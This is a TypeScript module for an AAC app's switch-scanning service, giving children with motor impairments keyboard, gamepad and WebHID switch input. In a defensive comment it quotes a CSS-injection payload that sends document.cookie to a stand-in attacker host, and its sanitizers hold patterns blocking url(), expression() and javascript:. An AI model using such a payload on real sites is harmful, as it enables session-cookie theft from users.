'use client';

/* ─────────────────────────────────────────────────────────────────────────────
 *  Switch Scanning Accessibility Service for PrismAAC
 *
 *  Enables communication for children with severe motor impairments
 *  (e.g., Cerebral Palsy) who use physical Bluetooth switches such as
 *  AbleNet Blue2 or similar. These users cannot touch the screen or use
 *  head tracking — a single switch press is their only input.
 *
 *  Scanning modes:
 *    • Auto-scan: automatically advances the highlight every N ms
 *    • Manual scan: advances only on switch press (Tab / gamepad / HID)
 *
 *  Group scanning (optional):
 *    Phase 1 — scan across rows/groups
 *    Phase 2 — scan within the selected group
 *    → reduces the number of presses needed to reach a target
 *
 *  Input sources:
 *    • Keyboard: Space/Enter = select, Tab = next, Shift+Tab = previous
 *    • WebHID API: generic HID switch devices (button press = select)
 *    • Gamepad API: any gamepad button = select (many switches enumerate
 *      as gamepads)
 *
 *  All browser-specific APIs (WebHID, Gamepad) are wrapped in feature
 *  detection so the service degrades gracefully in unsupported browsers.
 * ────────────────────────────────────────────────────────────────────────── */

// ── Public Types ────────────────────────────────────────────────────────────

export interface SwitchScanConfig {
  enabled: boolean;
  mode: 'auto' | 'manual';
  scanSpeedMs: number;      // 1000–5000, default 2000
  groupScan: boolean;       // scan rows first, then items within
  loops: number;            // how many full cycles before stopping (0 = infinite)
  highlightColor: string;   // CSS color for scan highlight ring
}

export type ScanPhase = 'idle' | 'groups' | 'items';

export interface SwitchScanState {
  phase: ScanPhase;
  groupIndex: number;
  itemIndex: number;
  loopCount: number;
  paused: boolean;
}

export interface SwitchScanCallbacks {
  /** Fires whenever the highlighted element changes. */
  onHighlight?: (element: Element | null) => void;
  /** Fires when an element is selected (clicked). */
  onSelect?: (element: Element) => void;
  /** Fires when scanning starts, stops, pauses, or resumes. */
  onStateChange?: (state: SwitchScanState) => void;
}

// ── Constants ───────────────────────────────────────────────────────────────

const STORAGE_KEY = 'prism-switch-scan';
const HIGHLIGHT_CLASS = 'switch-scan-active';

const INTERACTIVE_SELECTOR =
  'button, [role="button"], a, [data-dwell-target], .aac-btn, .aac-key';

/** Row/group attribute — set on container elements to enable group scanning. */
const GROUP_ATTR = 'data-scan-group';

const DEFAULT_CONFIG: SwitchScanConfig = {
  enabled: false,
  mode: 'auto',
  scanSpeedMs: 2000,
  groupScan: true,
  loops: 3,
  highlightColor: '#FFD600',
};

// ── Configuration Persistence ───────────────────────────────────────────────

/** Sanitize the persisted switch-scan config. Tampered persist could
 *  inject scanSpeedMs = 0 (infinite-loop CPU spike on the next-step
 *  setTimeout), loops = -1 (Math.max guard fails on NaN), or
 *  highlightColor with a CSS expression containing url() or
 *  expression() — modern browsers ignore unsafe color values but
 *  defensively strip anything that isn't a plausible color literal. */
function sanitizeConfig(parsed: Partial<SwitchScanConfig>): SwitchScanConfig {
  const out = { ...DEFAULT_CONFIG };
  if (typeof parsed.enabled === 'boolean') out.enabled = parsed.enabled;
  if (parsed.mode === 'auto' || parsed.mode === 'manual') out.mode = parsed.mode;
  if (typeof parsed.scanSpeedMs === 'number' && Number.isFinite(parsed.scanSpeedMs)
    && parsed.scanSpeedMs >= 200 && parsed.scanSpeedMs <= 60_000) {
    out.scanSpeedMs = parsed.scanSpeedMs;
  }
  if (typeof parsed.groupScan === 'boolean') out.groupScan = parsed.groupScan;
  if (typeof parsed.loops === 'number' && Number.isFinite(parsed.loops)
    && parsed.loops >= 0 && parsed.loops <= 1000) {
    out.loops = Math.floor(parsed.loops);
  }
  // highlightColor: hex (#rgb/#rrggbb), rgb()/rgba()/hsl()/hsla() with no
  // url/expression/javascript literal. Anything else falls back to default.
  if (typeof parsed.highlightColor === 'string'
    && parsed.highlightColor.length <= 64
    && /^(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|hsla?\([^)]+\)|[a-zA-Z]+)$/.test(parsed.highlightColor)
    && !/url\s*\(|expression\s*\(|javascript:/i.test(parsed.highlightColor)) {
    out.highlightColor = parsed.highlightColor;
  }
  return out;
}

export function loadConfig(): SwitchScanConfig {
  if (typeof window === 'undefined') return { ...DEFAULT_CONFIG };
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) {
      const parsed = JSON.parse(raw) as Partial<SwitchScanConfig>;
      return sanitizeConfig(parsed);
    }
  } catch { /* corrupt data — use defaults */ }
  return { ...DEFAULT_CONFIG };
}

export function saveConfig(config: SwitchScanConfig): void {
  if (typeof window === 'undefined') return;
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
  } catch { /* localStorage quota or disabled */ }
}

export function getDefaultConfig(): SwitchScanConfig {
  return { ...DEFAULT_CONFIG };
}

// ── Feature Detection ───────────────────────────────────────────────────────

export function isSwitchScanSupported(): boolean {
  // Switch scanning is keyboard-driven at minimum — always supported in a
  // browser with DOM access.
  return typeof window !== 'undefined' && typeof document !== 'undefined';
}

export function isWebHIDSupported(): boolean {
  if (typeof window === 'undefined') return false;
  if (typeof navigator === 'undefined') return false;
  return 'hid' in navigator && typeof (navigator as NavigatorWithHID).hid?.requestDevice === 'function';
}

export function isGamepadSupported(): boolean {
  if (typeof window === 'undefined') return false;
  return 'getGamepads' in navigator;
}

// ── WebHID type shims (not in all TS DOM libs) ─────────────────────────────

interface HIDDevice {
  opened: boolean;
  vendorId: number;
  productId: number;
  productName: string;
  open(): Promise<void>;
  close(): Promise<void>;
  addEventListener(type: string, listener: (event: HIDInputReportEvent) => void): void;
  removeEventListener(type: string, listener: (event: HIDInputReportEvent) => void): void;
}

interface HIDInputReportEvent {
  device: HIDDevice;
  reportId: number;
  data: DataView;
}

interface NavigatorHID {
  requestDevice(options: { filters: Array<{ usagePage?: number; usage?: number }> }): Promise<HIDDevice[]>;
  getDevices(): Promise<HIDDevice[]>;
  addEventListener(type: string, listener: (event: { device: HIDDevice }) => void): void;
  removeEventListener(type: string, listener: (event: { device: HIDDevice }) => void): void;
}

interface NavigatorWithHID extends Navigator {
  hid?: NavigatorHID;
}

// ── Element Discovery ───────────────────────────────────────────────────────

/**
 * Returns all visible interactive elements on the page in DOM order,
 * filtered to only those that are visible and not disabled.
 */
function discoverElements(): Element[] {
  if (typeof document === 'undefined') return [];
  const raw = document.querySelectorAll(INTERACTIVE_SELECTOR);
  const elements: Element[] = [];

  for (let i = 0; i < raw.length; i++) {
    const el = raw[i];
    if (el instanceof HTMLElement) {
      // Skip hidden/disabled elements
      if (el.offsetParent === null && getComputedStyle(el).position !== 'fixed') continue;
      if (el.hasAttribute('disabled')) continue;
      if (el.getAttribute('aria-hidden') === 'true') continue;
      if (el.tabIndex === -1) continue;
      elements.push(el);
    }
  }

  return elements;
}

/**
 * Group elements by their closest `[data-scan-group]` ancestor.
 * Returns an array of groups, each containing its child interactive elements.
 * Elements without a group ancestor are placed into a synthetic group.
 */
function discoverGroups(): Element[][] {
  const elements = discoverElements();
  if (elements.length === 0) return [];

  const groupMap = new Map<Element | null, Element[]>();
  const groupOrder: (Element | null)[] = [];

  for (const el of elements) {
    const groupContainer = el.closest(`[${GROUP_ATTR}]`);
    if (!groupMap.has(groupContainer)) {
      groupMap.set(groupContainer, []);
      groupOrder.push(groupContainer);
    }
    groupMap.get(groupContainer)!.push(el);
  }

  // If no group containers exist, try to infer rows by vertical position
  if (groupOrder.length === 1 && groupOrder[0] === null) {
    return inferRowGroups(elements);
  }

  return groupOrder.map((g) => groupMap.get(g)!);
}

/**
 * Infer visual rows by bucketing elements whose vertical centers are
 * within 20px of each other. This allows group scanning even when the
 * DOM doesn't have explicit `data-scan-group` containers.
 */
function inferRowGroups(elements: Element[]): Element[][] {
  if (elements.length === 0) return [];
  // Viewport-relative threshold: 5% of screen height handles responsive
  // layouts from iPhone to 4K monitor without splitting visual rows.
  const ROW_THRESHOLD = Math.max(20, window.innerHeight * 0.05);

  const withY = elements.map((el) => {
    const rect = el.getBoundingClientRect();
    return { el, y: rect.top + rect.height / 2 };
  });

  // Sort by vertical position
  withY.sort((a, b) => a.y - b.y);

  const rows: Element[][] = [];
  let currentRow: Element[] = [withY[0].el];
  let currentY = withY[0].y;

  for (let i = 1; i < withY.length; i++) {
    if (Math.abs(withY[i].y - currentY) <= ROW_THRESHOLD) {
      currentRow.push(withY[i].el);
    } else {
      rows.push(currentRow);
      currentRow = [withY[i].el];
      currentY = withY[i].y;
    }
  }
  rows.push(currentRow);

  return rows;
}

// ── Highlight Management ────────────────────────────────────────────────────

let currentHighlighted: Element | null = null;

function highlightElement(el: Element | null): void {
  if (currentHighlighted) {
    currentHighlighted.classList.remove(HIGHLIGHT_CLASS);
  }
  currentHighlighted = el;
  if (el) {
    el.classList.add(HIGHLIGHT_CLASS);
    // Scroll into view if needed, gently (no jarring jumps)
    el.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'nearest' });
  }
}

function clearHighlight(): void {
  if (currentHighlighted) {
    currentHighlighted.classList.remove(HIGHLIGHT_CLASS);
    currentHighlighted = null;
  }
}

/**
 * Inject the CSS custom property for highlight color into a style tag.
 * Called once when scanning starts.
 */
/** Color-shape gate for the CSS injection point below. The entire
 *  string is interpolated into a <style> tag's textContent — a
 *  string like `red; } body { background: url('//attacker.com/?'+document.cookie) } a {`
 *  would otherwise break out of the rule and execute attacker CSS.
 *  This guard is the canonical defense; loadConfig also validates
 *  but a future settings UI that bypasses loadConfig would
 *  otherwise leave the foot-gun. */
function isSafeCssColor(color: string): boolean {
  if (typeof color !== 'string' || color.length === 0 || color.length > 64) return false;
  if (!/^(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|hsla?\([^)]+\)|[a-zA-Z]+)$/.test(color)) return false;
  if (/url\s*\(|expression\s*\(|javascript:|;|\{|\}/i.test(color)) return false;
  return true;
}

let styleInjected = false;
function injectHighlightStyle(color: string): void {
  if (typeof document === 'undefined') return;
  const safeColor = isSafeCssColor(color) ? color : '#FFD600';
  const STYLE_ID = 'prism-switch-scan-style';
  let styleEl = document.getElementById(STYLE_ID) as HTMLStyleElement | null;
  if (!styleEl) {
    styleEl = document.createElement('style');
    styleEl.id = STYLE_ID;
    document.head.appendChild(styleEl);
  }
  styleEl.textContent = `
    .${HIGHLIGHT_CLASS} {
      outline: 4px solid ${safeColor} !important;
      outline-offset: 3px !important;
      box-shadow: 0 0 0 6px rgba(0,0,0,0.25), 0 0 12px 4px ${safeColor} !important;
      transition: outline 0.15s ease, box-shadow 0.15s ease !important;
      z-index: 9000 !important;
      position: relative;
    }
  `;
  styleInjected = true;
}

function removeHighlightStyle(): void {
  if (typeof document === 'undefined') return;
  const STYLE_ID = 'prism-switch-scan-style';
  const styleEl = document.getElementById(STYLE_ID);
  if (styleEl) styleEl.remove();
  styleInjected = false;
}

// ── Core Scanning Engine ────────────────────────────────────────────────────

let scanTimer: ReturnType<typeof setInterval> | null = null;
let gamepadRafId: number | null = null;
let activeHIDDevices: HIDDevice[] = [];
let domObserver: MutationObserver | null = null;

// State
let state: SwitchScanState = {
  phase: 'idle',
  groupIndex: 0,
  itemIndex: 0,
  loopCount: 0,
  paused: false,
};

let activeConfig: SwitchScanConfig = { ...DEFAULT_CONFIG };
let activeCallbacks: SwitchScanCallbacks = {};

// Cached element structures (refreshed on each scan cycle)
let flatElements: Element[] = [];
let groupedElements: Element[][] = [];

/** Refresh element lists from the current DOM state. */
function refreshElements(): void {
  flatElements = discoverElements();
  if (activeConfig.groupScan) {
    groupedElements = discoverGroups();
  }
}

function emitState(): void {
  activeCallbacks.onStateChange?.({ ...state });
}

// ── Navigation ──────────────────────────────────────────────────────────────

function advanceNext(): void {
  if (state.paused || state.phase === 'idle') return;

  // Refresh elements in case the DOM changed (new page, category switch, etc.)
  refreshElements();

  if (activeConfig.groupScan && state.phase === 'groups') {
    advanceNextGroup();
  } else {
    advanceNextItem();
  }
}

function advancePrevious(): void {
  if (state.paused || state.phase === 'idle') return;
  refreshElements();

  if (activeConfig.groupScan && state.phase === 'groups') {
    advancePreviousGroup();
  } else {
    advancePreviousItem();
  }
}

function advanceNextGroup(): void {
  if (groupedElements.length === 0) return;

  state.groupIndex++;
  if (state.groupIndex >= groupedElements.length) {
    state.groupIndex = 0;
    state.loopCount++;
    if (activeConfig.loops > 0 && state.loopCount >= activeConfig.loops) {
      stopScan();
      return;
    }
  }

  highlightGroup(state.groupIndex);
  emitState();
}

function advancePreviousGroup(): void {
  if (groupedElements.length === 0) return;

  state.groupIndex--;
  if (state.groupIndex < 0) {
    state.groupIndex = groupedElements.length - 1;
  }

  highlightGroup(state.groupIndex);
  emitState();
}

function advanceNextItem(): void {
  const items = activeConfig.groupScan && state.phase === 'items'
    ? groupedElements[state.groupIndex] || []
    : flatElements;

  if (items.length === 0) return;

  state.itemIndex++;
  if (state.itemIndex >= items.length) {
    state.itemIndex = 0;
    // In group scanning items phase, looping wraps back to group phase
    if (activeConfig.groupScan && state.phase === 'items') {
      state.phase = 'groups';
      state.itemIndex = 0;
      highlightGroup(state.groupIndex);
      emitState();
      return;
    }
    state.loopCount++;
    if (activeConfig.loops > 0 && state.loopCount >= activeConfig.loops) {
      stopScan();
      return;
    }
  }

  const target = items[state.itemIndex];
  highlightElement(target);
  activeCallbacks.onHighlight?.(target);
  emitState();
}

function advancePreviousItem(): void {
  const items = activeConfig.groupScan && state.phase === 'items'
    ? groupedElements[state.groupIndex] || []
    : flatElements;

  if (items.length === 0) return;

  state.itemIndex--;
  if (state.itemIndex < 0) {
    // In group scanning items phase, go back to group phase
    if (activeConfig.groupScan && state.phase === 'items') {
      state.phase = 'groups';
      state.itemIndex = 0;
      highlightGroup(state.groupIndex);
      emitState();
      return;
    }
    state.itemIndex = items.length - 1;
  }

  const target = items[state.itemIndex];
  highlightElement(target);
  activeCallbacks.onHighlight?.(target);
  emitState();
}

/**
 * Highlight all elements in a group by highlighting the group container
 * (or the first element if no container exists).
 */
function highlightGroup(index: number): void {
  if (index < 0 || index >= groupedElements.length) return;
  const group = groupedElements[index];
  if (group.length === 0) return;

  // Try to highlight the group container
  const firstEl = group[0];
  const container = firstEl.closest(`[${GROUP_ATTR}]`);
  highlightElement(container || firstEl);
  activeCallbacks.onHighlight?.(container || firstEl);
}

// ── Selection ───────────────────────────────────────────────────────────────

function selectCurrent(): void {
  if (state.paused || state.phase === 'idle') return;

  // Group scanning: selecting a group enters item-scan within that group
  if (activeConfig.groupScan && state.phase === 'groups') {
    state.phase = 'items';
    state.itemIndex = -1; // will advance to 0 on next tick
    clearHighlight();
    // Immediately show the first item
    advanceNextItem();
    restartAutoTimer();
    return;
  }

  // Item-level selection: click the highlighted element
  const items = activeConfig.groupScan && state.phase === 'items'
    ? groupedElements[state.groupIndex] || []
    : flatElements;

  if (state.itemIndex < 0 || state.itemIndex >= items.length) return;

  const target = items[state.itemIndex];
  if (target instanceof HTMLElement) {
    target.click();
    activeCallbacks.onSelect?.(target);
  }

  // After selection in group mode, return to group scanning
  if (activeConfig.groupScan && state.phase === 'items') {
    state.phase = 'groups';
    state.itemIndex = 0;
    // Refresh elements since the click may have changed the DOM
    refreshElements();
    highlightGroup(state.groupIndex);
    restartAutoTimer();
  }
}

// ── Auto-Scan Timer ─────────────────────────────────────────────────────────

function startAutoTimer(): void {
  if (activeConfig.mode !== 'auto') return;
  stopAutoTimer();
  const speed = Math.max(1000, Math.min(5000, activeConfig.scanSpeedMs));
  scanTimer = setInterval(() => {
    if (!state.paused) {
      advanceNext();
    }
  }, speed);
}

function stopAutoTimer(): void {
  if (scanTimer !== null) {
    clearInterval(scanTimer);
    scanTimer = null;
  }
}

function restartAutoTimer(): void {
  if (activeConfig.mode === 'auto' && state.phase !== 'idle') {
    startAutoTimer();
  }
}

// ── Keyboard Input ──────────────────────────────────────────────────────────

// When a switch user selects an input field, the scanner must NOT
// trap them inside it. Instead, the scanner continues to control
// navigation — Space/Enter still selects the highlighted key on the
// AAC keyboard (which types into the input), and Escape blurs the
// input to return to normal scanning.
function isInputFocused(): boolean {
  const tag = document.activeElement?.tagName;
  return tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT';
}

function onKeyDown(e: KeyboardEvent): void {
  if (state.phase === 'idle') return;

  // If an input is focused and the user presses Escape, blur it to
  // return scanner control. Don't let the input trap the switch user.
  if (isInputFocused() && e.key === 'Escape') {
    e.preventDefault();
    (document.activeElement as HTMLElement)?.blur();
    refreshElements();
    return;
  }

  // Scanner always controls Space/Enter/Tab — even when an input is
  // focused. The scanner drives the AAC keyboard, which types into
  // the input via programmatic click → handleKey.
  switch (e.key) {
    case ' ':
    case 'Enter':
      e.preventDefault();
      e.stopPropagation();
      selectCurrent();
      break;
    case 'Tab':
      e.preventDefault();
      e.stopPropagation();
      if (e.shiftKey) {
        advancePrevious();
      } else {
        advanceNext();
      }
      break;
    case 'Escape':
      if (activeConfig.groupScan && state.phase === 'items') {
        e.preventDefault();
        state.phase = 'groups';
        state.itemIndex = 0;
        highlightGroup(state.groupIndex);
        restartAutoTimer();
        emitState();
      }
      break;
  }
}

// ── Gamepad Input ───────────────────────────────────────────────────────────

let prevGamepadButtonStates: boolean[][] = [];

function pollGamepads(): void {
  if (!isGamepadSupported()) return;

  const gamepads = navigator.getGamepads();
  if (!gamepads) return;

  for (let gi = 0; gi < gamepads.length; gi++) {
    const gp = gamepads[gi];
    if (!gp) continue;

    // Initialize previous states if needed
    if (!prevGamepadButtonStates[gi]) {
      prevGamepadButtonStates[gi] = gp.buttons.map((b) => b.pressed);
      continue;
    }

    for (let bi = 0; bi < gp.buttons.length; bi++) {
      const wasPressed = prevGamepadButtonStates[gi][bi] || false;
      const isPressed = gp.buttons[bi].pressed;

      // Trigger on button-down edge (not held)
      if (isPressed && !wasPressed) {
        selectCurrent();
        // Only process one button per frame
        break;
      }
    }

    prevGamepadButtonStates[gi] = gp.buttons.map((b) => b.pressed);
  }
}

function startGamepadPolling(): void {
  if (!isGamepadSupported()) return;
  prevGamepadButtonStates = [];

  function loop() {
    if (state.phase === 'idle') return;
    pollGamepads();
    gamepadRafId = requestAnimationFrame(loop);
  }

  gamepadRafId = requestAnimationFrame(loop);
}

function stopGamepadPolling(): void {
  if (gamepadRafId !== null) {
    cancelAnimationFrame(gamepadRafId);
    gamepadRafId = null;
  }
  prevGamepadButtonStates = [];
}

// ── WebHID Input ────────────────────────────────────────────────────────────

// Edge detection + debounce for HID input reports.
// Without this, a held switch fires selectCurrent() at 60-125Hz (hardware
// polling rate), locking up the app. A child with spastic CP may hold the
// switch for seconds — we must fire exactly once per press.
let lastHIDState = 0;
let lastHIDTime = 0;
const HID_DEBOUNCE_MS = 200;

function onHIDInputReport(event: HIDInputReportEvent): void {
  const { data } = event;
  let currentState = 0;
  for (let i = 0; i < data.byteLength; i++) {
    currentState |= data.getUint8(i);
  }
  const now = performance.now();

  // Edge detection: fire only on 0→1 transition + 200ms debounce
  if (currentState !== 0 && lastHIDState === 0 && (now - lastHIDTime > HID_DEBOUNCE_MS)) {
    lastHIDTime = now;
    selectCurrent();
  }
  lastHIDState = currentState;
}

async function connectHIDDevices(): Promise<void> {
  if (!isWebHIDSupported()) return;
  const hid = (navigator as NavigatorWithHID).hid!;

  try {
    // Check for already-paired devices first
    const paired = await hid.getDevices();
    for (const device of paired) {
      await openHIDDevice(device);
    }

    // Listen for new device connections
    hid.addEventListener('connect', async (event: { device: HIDDevice }) => {
      await openHIDDevice(event.device);
    });

    hid.addEventListener('disconnect', (event: { device: HIDDevice }) => {
      activeHIDDevices = activeHIDDevices.filter((d) => d !== event.device);
    });
  } catch {
    // WebHID not available or permission denied — degrade gracefully
  }
}

async function openHIDDevice(device: HIDDevice): Promise<void> {
  try {
    if (!device.opened) {
      await device.open();
    }
    device.addEventListener('inputreport', onHIDInputReport);
    activeHIDDevices.push(device);
  } catch {
    // Device open failed — skip this device
  }
}

function disconnectHIDDevices(): void {
  for (const device of activeHIDDevices) {
    try {
      device.removeEventListener('inputreport', onHIDInputReport);
      device.close().catch(() => {});
    } catch { /* best effort cleanup */ }
  }
  activeHIDDevices = [];
}

/**
 * Request user to pair a new HID switch device.
 * Must be called from a user gesture (click/keydown handler).
 * Returns true if a device was paired and connected.
 */
export async function requestHIDDevice(): Promise<boolean> {
  if (!isWebHIDSupported()) return false;
  const hid = (navigator as NavigatorWithHID).hid!;

  try {
    const devices = await hid.requestDevice({
      filters: [
        // Assistive technology HID usage page
        { usagePage: 0x01, usage: 0x00 },
        // Generic desktop controls
        { usagePage: 0x01 },
        // Button page — most single-switch devices
        { usagePage: 0x09 },
      ],
    });
    for (const device of devices) {
      await openHIDDevice(device);
    }
    return devices.length > 0;
  } catch {
    return false;
  }
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

/**
 * Start switch scanning.
 * Discovers interactive elements, sets up all input listeners, and begins
 * the scan cycle (auto or manual depending on config).
 */
export function startScan(
  config?: Partial<SwitchScanConfig>,
  callbacks?: SwitchScanCallbacks,
): void {
  // Stop any existing scan first
  if (state.phase !== 'idle') {
    stopScan();
  }

  activeConfig = { ...loadConfig(), ...config };
  activeCallbacks = callbacks || {};

  if (!activeConfig.enabled) return;
  if (typeof document === 'undefined') return;

  // Inject highlight CSS
  injectHighlightStyle(activeConfig.highlightColor);

  // Discover elements
  refreshElements();

  const hasElements = activeConfig.groupScan
    ? groupedElements.length > 0
    : flatElements.length > 0;

  if (!hasElements) return;

  // Initialize state
  state = {
    phase: activeConfig.groupScan ? 'groups' : 'items',
    groupIndex: 0,
    itemIndex: activeConfig.groupScan ? 0 : -1,
    loopCount: 0,
    paused: false,
  };

  // Show initial highlight
  if (activeConfig.groupScan) {
    highlightGroup(0);
  } else {
    // Advance to the first item
    advanceNextItem();
  }

  // Keyboard listener (capture phase so we intercept before app handlers)
  document.addEventListener('keydown', onKeyDown, true);

  // Start auto-timer if in auto mode
  if (activeConfig.mode === 'auto') {
    startAutoTimer();
  }

  // Start gamepad polling
  startGamepadPolling();

  // Connect WebHID devices
  connectHIDDevices();

  // Auto-refresh on DOM changes. Must observe 'class' to detect Tailwind
  // visibility toggles (hidden, opacity-0) — but must ignore our own
  // switch-scan-active class to prevent infinite loops.
  let rescanDebounce: ReturnType<typeof setTimeout> | null = null;
  if (typeof MutationObserver !== 'undefined') {
    domObserver = new MutationObserver((mutations) => {
      // Ignore mutations that ONLY add/remove our highlight class
      const isOnlyScanClass = mutations.every(m => {
        if (m.type !== 'attributes' || m.attributeName !== 'class') return false;
        const el = m.target as HTMLElement;
        const old = m.oldValue || '';
        const cur = el.className || '';
        const diff = old.includes(HIGHLIGHT_CLASS) !== cur.includes(HIGHLIGHT_CLASS);
        const otherChanges = old.replace(HIGHLIGHT_CLASS, '').trim() !== cur.replace(HIGHLIGHT_CLASS, '').trim();
        return diff && !otherChanges;
      });
      if (isOnlyScanClass) return;

      if (rescanDebounce) clearTimeout(rescanDebounce);
      rescanDebounce = setTimeout(() => {
        if (state.phase !== 'idle' && !state.paused) refreshElements();
      }, 150);
    });
    domObserver.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeOldValue: true,
      attributeFilter: ['class', 'disabled', 'hidden', 'aria-hidden'],
    });
  }

  emitState();
}

/**
 * Stop switch scanning entirely. Cleans up all listeners and timers.
 */
export function stopScan(): void {
  stopAutoTimer();
  stopGamepadPolling();
  disconnectHIDDevices();
  clearHighlight();

  if (domObserver) { domObserver.disconnect(); domObserver = null; }

  if (typeof document !== 'undefined') {
    document.removeEventListener('keydown', onKeyDown, true);
  }

  removeHighlightStyle();

  state = {
    phase: 'idle',
    groupIndex: 0,
    itemIndex: 0,
    loopCount: 0,
    paused: false,
  };

  flatElements = [];
  groupedElements = [];

  emitState();
}

/**
 * Pause scanning. The highlight stays on the current element but the
 * auto-timer stops and input is ignored.
 */
export function pauseScan(): void {
  if (state.phase === 'idle') return;
  state.paused = true;
  stopAutoTimer();
  emitState();
}

/**
 * Resume scanning after a pause.
 */
export function resumeScan(): void {
  if (state.phase === 'idle' || !state.paused) return;
  state.paused = false;
  if (activeConfig.mode === 'auto') {
    startAutoTimer();
  }
  emitState();
}

/**
 * Get the current scan state (read-only snapshot).
 */
export function getState(): SwitchScanState {
  return { ...state };
}

/**
 * Update scanning speed while a scan is active.
 * Clamps to 1000–5000 ms range.
 */
export function setScanSpeed(ms: number): void {
  activeConfig.scanSpeedMs = Math.max(1000, Math.min(5000, ms));
  if (state.phase !== 'idle' && activeConfig.mode === 'auto' && !state.paused) {
    restartAutoTimer();
  }
}

/**
 * Toggle between auto and manual scanning mode while a scan is active.
 */
export function setMode(mode: 'auto' | 'manual'): void {
  activeConfig.mode = mode;
  if (state.phase !== 'idle') {
    if (mode === 'auto' && !state.paused) {
      startAutoTimer();
    } else {
      stopAutoTimer();
    }
  }
}

/**
 * Force a re-discovery of interactive elements.
 * Call this after navigating to a new page/category within PrismAAC.
 */
export function rescanElements(): void {
  if (state.phase === 'idle') return;
  refreshElements();

  // Reset indices to avoid out-of-bounds
  state.groupIndex = 0;
  state.itemIndex = 0;
  state.phase = activeConfig.groupScan ? 'groups' : 'items';

  if (activeConfig.groupScan && groupedElements.length > 0) {
    highlightGroup(0);
  } else if (flatElements.length > 0) {
    state.itemIndex = -1;
    advanceNextItem();
  } else {
    clearHighlight();
  }

  restartAutoTimer();
  emitState();
}
